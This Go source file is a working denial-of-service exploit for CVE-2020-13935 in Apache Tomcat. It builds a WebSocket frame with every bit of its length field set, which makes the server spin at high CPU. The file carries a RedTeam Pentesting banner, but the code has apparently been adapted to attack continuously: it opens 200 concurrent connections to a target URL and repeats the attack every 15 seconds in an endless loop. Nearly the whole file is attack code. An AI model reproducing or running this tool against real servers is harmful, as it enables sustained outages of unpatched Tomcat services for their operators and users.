/****************************************
 *                                      *
 *  RedTeam Pentesting GmbH             *
 *  kontakt@redteam-pentesting.de       *
 *  https://www.redteam-pentesting.de/  *
 *                                      *
 ****************************************/

package main

import (
	"bytes"
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// CVE-2020-13935
//
// this program exploits a bug in tomcat which leads to continuous,
// high cpu usage if all bits of the length field of a websocket message
// are set to 1.
//
// Affected Versions:
// 10.0.0-M1 to 10.0.0-M6
// 9.0.0.M1 to 9.0.36
// 8.5.0 to 8.5.56
// 8.0.1 to 8.0.53
// 7.0.27 to 7.0.104
//
// see:
// https://bz.apache.org/bugzilla/show_bug.cgi?id=64563
// https://access.redhat.com/security/cve/CVE-2020-13935

func main() {
	i := 0
	for {
		i++
		fmt.Println("开始运行")
		if err := run(); err != nil {
			fmt.Fprintln(os.Stderr, err)
		}
		time.Sleep(15 * time.Second)
	}
}

func sendInvalidWebSocketMessage(url string) error {
	fmt.Println("链接：" + url)
	ws, _, err := websocket.DefaultDialer.Dial(url, nil)

	if err != nil {
		return fmt.Errorf("dial: %s", err)
	}

	// +-+-+-+-+-------+-+-------------+-------------------------------+
	//  0                   1                   2                   3
	//  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
	// +-+-+-+-+-------+-+-------------+-------------------------------+
	// |F|R|R|R| opcode|M| Payload len |    Extended payload length    |
	// |I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
	// |N|V|V|V|       |S|             |   (if payload len==126/127)   |
	// | |1|2|3|       |K|             |                               |
	// +-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
	// |     Extended payload length continued, if payload len == 127  |
	// + - - - - - - - - - - - - - - - +-------------------------------+
	// |                               | Masking-key, if MASK set to 1 |
	// +-------------------------------+-------------------------------+
	// | Masking-key (continued)       |          Payload Data         |
	// +-------------------------------- - - - - - - - - - - - - - - - +
	// :                     Payload Data continued ...                :
	// + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
	// |                     Payload Data continued ...                |
	// +---------------------------------------------------------------+

	var buf bytes.Buffer

	fin := 1
	rsv1 := 0
	rsv2 := 0
	rsv3 := 0
	opcode := websocket.TextMessage

	buf.WriteByte(byte(fin<<7 | rsv1<<6 | rsv2<<5 | rsv3<<4 | opcode))

	// always set the mask bit
	// indicate 64 bit message length
	buf.WriteByte(byte(1<<7 | 0b1111111))

	// set msb to 1, violating the spec and triggering the bug
	buf.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})

	// 4 byte masking key
	// leave zeros for now, so we do not need to mask
	maskingKey := []byte{0, 0, 0, 0}
	buf.Write(maskingKey)

	// write an incomplete message
	message := "Lorem ipsum dolor sit amet. Aut voluptatibus repellat 33 nobis porro ab ipsa temporibus aut velit deserunt. Et ratione necessitatibus et assumenda illo et mollitia voluptatem et possimus ullam ab debitis voluptas. Et facilis numquam sed temporibus odit sit debitis quia et tempore aliquam? Qui cumque deleniti eum sunt iure ut enim aspernatur qui optio voluptatibus. Vel vero consequatur et dicta adipisci ad minus unde ea asperiores illo sit vitae exercitationem. Eum veritatis molestiae At laudantium eaque qui autem reiciendis. Hic doloremque itaque id necessitatibus quis in soluta alias ut sunt neque. Aut magnam nihil qui autem consectetur non porro quibusdam qui quasi veniam. Nam aperiam ullam ut vero placeat et soluta ratione. Et molestiae praesentium est facere accusamus sed dolore quisquam? Est excepturi dolores ea dolorem architecto vel itaque illum aut dolorem repellat aut eveniet quod sed pariatur quia ea omnis porro. Aut nesciunt accusantium est error quod eum maiores voluptates ut architecto quisquam ut velit molestiae est fugit nihil. Et animi odio aut nihil earum est dolor ducimus. Quo omnis consectetur ut dolores tenetur qui optio illo ut omnis laudantium sed tenetur placeat qui exercitationem fuga. In enim unde id nesciunt doloribus non amet dolore a suscipit molestias aut eius illum aut sunt nesciunt. Qui autem omnis et dolor nostrum et sunt ducimus qui quibusdam enim aut atque internos. Eos corrupti Quis ut quia veniam et unde consequuntur non voluptatem saepe. Id provident mollitia sed cupiditate molestias est laudantium corrupti 33 molestiae culpa sit maiores consequatur sit dolorem necessitatibus? Illum laudantium cum cupiditate doloremque ad error illum ut ratione molestiae ut corrupti vero et error aliquam est aspernatur similique. A repudiandae inventore vel commodi facere non molestias deleniti. Qui temporibus corrupti id quia molestiae quo ratione voluptatem sed veritatis laboriosam et omnis impedit ut magni voluptas. Qui adipisci assumenda et voluptatem iure est saepe modi? Et similique sequi aut deleniti sint eum aspernatur minima. Et rerum beatae quo ipsam sunt ad quibusdam suscipit ut consequatur voluptate? Ut modi enim rem itaque quae eum quibusdam nobis est veritatis sint. Et deleniti ducimus ut voluptas adipisci et saepe consequatur. Est pariatur minus non odio eaque non expedita repudiandae ex laudantium autem aut dolorem laudantium. Eum autem internos id porro velit id consequatur galisum eos quae provident est nostrum magnam non accusantium dignissimos. Minima obcaecati et sapiente voluptate qui culpa esse qui rerum animi quo sequi galisum et nihil internos sed cumque nisi. Et voluptate Quis aut illo saepe quo architecto voluptatem rem atque neque eum esse temporibus. Sit assumenda consequuntur ut autem reiciendis et porro harum. Et corporis internos a voluptatem impedit qui officiis minus eum illum voluptas aut quia minima? Qui fuga nemo qui reprehenderit nesciunt eos similique reiciendis quo voluptas possimus hic provident quam ut veritatis nisi At expedita molestiae. Sit unde nihil et fuga possimus ex sunt soluta ea assumenda earum sit libero suscipit eos laudantium maxime eum pariatur facilis. Qui quasi sint non necessitatibus odio et omnis ipsum. Non expedita quis ad repudiandae aperiam et sequi totam non nesciunt quisquam? Id repellat architecto non reprehenderit porro non consequatur asperiores qui mollitia quas. Aut explicabo omnis qui Quis temporibus et earum officia. Nam vitae aperiam et corporis expedita sed voluptatum sunt aut iste sunt. "

	for i := 0; i < 40; i++ {
		buf.WriteString(message)
	}

	_, err = ws.UnderlyingConn().Write(buf.Bytes())
	if err != nil {
		return fmt.Errorf("write: %s", err)
	}

	// keep the websocket connection open for some time
	time.Sleep(30 * time.Second)

	return nil
}

func run() error {
	if len(os.Args) != 2 {
		return fmt.Errorf("usage: %s target_url", os.Args[0])
	}

	targetURL := os.Args[1]

	var wg sync.WaitGroup

	for i := 0; i < 200; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			if err := sendInvalidWebSocketMessage(targetURL); err != nil {
				fmt.Println(err)
			}
		}()
	}

	wg.Wait()

	return nil
}
